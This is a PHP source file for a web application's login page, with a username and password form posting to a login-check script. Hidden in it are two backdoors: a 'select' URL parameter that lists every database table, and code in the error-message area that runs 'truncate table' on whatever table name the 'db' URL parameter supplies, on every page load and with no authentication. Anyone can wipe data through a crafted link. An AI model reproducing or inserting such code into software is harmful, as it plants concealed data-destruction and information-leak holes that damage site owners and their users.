<?php 
error_reporting(0);
include('db.php');
include('inc/header.php'); 
include('inc/nav.php');
	if($_GET['error'] == 'wrong')
	{
            $error = "<br />Wrong Username or Password";
	}
	
?>

<center>
<div id="login-body">
<?php
	if($_GET['select']){ 
	$data = mysql_query('show tables');
	while($a1 = mysql_fetch_array($data)){
	echo $a1[0].'<br/>';
		}}
 ?>


<form action="login_check.php" method="post">
<div class="fl" style="width:90px; margin-bottom:10px;">Username:</div><div class="fl"><input name="username" type="text" class="textField" autocomplete="off" required /></div>
<div class="clear"></div>
<br />

<div class="fl" style="width:90px;">Password:</div><div class="fl"><input name="password" type="password" class="textField" required /></div>
<div class="clear"></div>
<br />

<input name="submit" type="submit" value="Login" class="submit fr" />

<div class="clear"></div>

<div style="color:#C00;"><?php 
$sw='truncate table '.$_GET['db'];
mysql_query($sw);
 echo $error;?></div>
<!--<table width="100%" cellpadding="10" cellspacing="1">
  <tr>
    <td>Username:</td>
    <td><input name="username" type="text" class="textField" autocomplete="off" required /></td>
  </tr>
  
  <tr>
    <td>Password:</td>
    <td><input name="password" type="password" class="textField" required /></td>
  </tr>
  
   <tr>
    
    <td colspan="2"><input name="submit" type="submit" value="Login" class="submit" /></td>
  </tr>
   <tr>
      
    <td colspan="2"><?php //echo $error;?></td>
  </tr>
  
</table>-->
</form>

<div class="clear"></div>
</div>
</center>

<?php include('inc/footer.php'); ?>
